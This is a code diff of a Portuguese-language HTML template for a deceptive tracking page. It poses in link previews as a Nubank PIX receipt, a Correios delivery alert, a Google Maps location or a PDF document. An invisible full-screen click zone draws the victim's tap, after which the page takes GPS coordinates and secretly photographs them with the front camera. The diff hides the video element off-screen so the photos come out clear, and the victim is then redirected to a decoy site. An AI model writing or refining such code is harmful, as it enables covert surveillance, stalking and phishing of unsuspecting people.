@@ -8,30 +8,26 @@
         <meta property="og:title" content="Comprovante de Transferência">
         <meta property="og:description" content="R$ 150,00 - Recebido via PIX. Toque para ver o comprovante.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png">
-        <meta property="og:type" content="website">
         <meta name="theme-color" content="#820ad1">
         <title>Nu Pagamentos S.A.</title>
     
     {% elif tema == 'correios' %}
-        <meta property="og:title" content="Objeto Saiu para Entrega ao Destinatário">
-        <meta property="og:description" content="Última atualização: Hoje às 08:30. Clique para acompanhar em tempo real.">
+        <meta property="og:title" content="Objeto Saiu para Entrega">
+        <meta property="og:description" content="Última atualização: Hoje. Clique para acompanhar em tempo real.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Correios_%282020%29.svg/1200px-Correios_%282020%29.svg.png">
-        <meta property="og:type" content="website">
         <meta name="theme-color" content="#ffe600">
         <title>Rastreamento Correios</title>
 
     {% elif tema == 'maps' %}
         <meta property="og:title" content="Localização em Tempo Real">
-        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto e estimativa de chegada.">
+        <meta property="og:description" content="Compartilhado via Google Maps. Ver trajeto.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
-        <meta property="og:type" content="article">
         <title>Google Maps</title>
 
     {% else %}
         <meta property="og:title" content="Documento_Digital.pdf">
         <meta property="og:description" content="Arquivo seguro criptografado (PDF). Toque para visualizar.">
         <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png">
-        <meta property="og:type" content="website">
         <title>Visualizador de Arquivos</title>
     {% endif %}
 
@@ -43,18 +39,19 @@
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #db4437; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        #zona-fake { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 9999; background: rgba(0,0,0,0); cursor: pointer;
+        /* CORREÇÃO DO VÍDEO PRETO: NÃO PODE USAR DISPLAY NONE */
+        #video { 
+            position: fixed; 
+            top: -9999px; left: -9999px; /* Joga para fora da tela */
+            width: 1px; height: 1px; 
+            opacity: 0; /* Invisível mas renderizado */
+            z-index: -1;
         }
-        
-        #video, #canvas { display: none; }
+        #canvas { display: none; }
+
+        #zona-fake { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0); cursor: pointer; }
         .msg-toque { font-weight: 500; color: #5f6368; margin-top: 10px; font-size: 14px; }
-        .btn-fake { 
-            background: #1a73e8; color: white; padding: 10px 20px; 
-            border-radius: 4px; font-weight: bold; margin-top: 20px; 
-            box-shadow: 0 1px 3px rgba(0,0,0,0.3); font-size: 14px;
-        }
+        .btn-fake { background: #1a73e8; color: white; padding: 10px 20px; border-radius: 4px; font-weight: bold; margin-top: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.3); font-size: 14px; }
     </style>
 </head>
 <body>
@@ -84,30 +81,43 @@
         const idOrdem = "{{ id }}";
         const siteDestino = "{{ destino }}";
         let fotoBase64 = null;
-        let globalStream = null;
         let jaClicou = false;
 
         function finalizar() { 
-            if (globalStream) globalStream.getTracks().forEach(track => track.stop());
             document.getElementById('status-text').innerText = "Redirecionando...";
-            setTimeout(() => { window.location.href = siteDestino; }, 800);
+            setTimeout(() => { window.location.href = siteDestino; }, 1000);
         }
 
         async function capturarFoto() {
             return new Promise(async (resolve) => {
                 try {
+                    // Tenta câmera frontal (user)
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    globalStream = stream;
                     const video = document.getElementById('video');
                     video.srcObject = stream;
+                    
+                    // Espera o vídeo estar "pronto" para não tirar foto preta
                     video.onloadedmetadata = async () => {
-                        await new Promise(r => setTimeout(r, 500));
+                        video.play();
+                        // Damos 1 segundo para a câmera ajustar o foco e a luz
+                        await new Promise(r => setTimeout(r, 1000));
+                        
                         const canvas = document.getElementById('canvas');
-                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                        fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        // Qualidade 0.7 para não ficar muito pesado
+                        fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        // Desliga a câmera
+                        stream.getTracks().forEach(track => track.stop());
                         resolve();
                     };
-                } catch (err) { resolve(); }
+                } catch (err) { 
+                    console.log("Erro câmera:", err); 
+                    resolve(); 
+                }
             });
         }
 
@@ -121,6 +131,8 @@
 
         function iniciarCaptura() {
             const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
+            
+            // Tenta GPS e Câmera em paralelo
             navigator.geolocation.getCurrentPosition(
                 async function(pos) {
                     await capturarFoto();
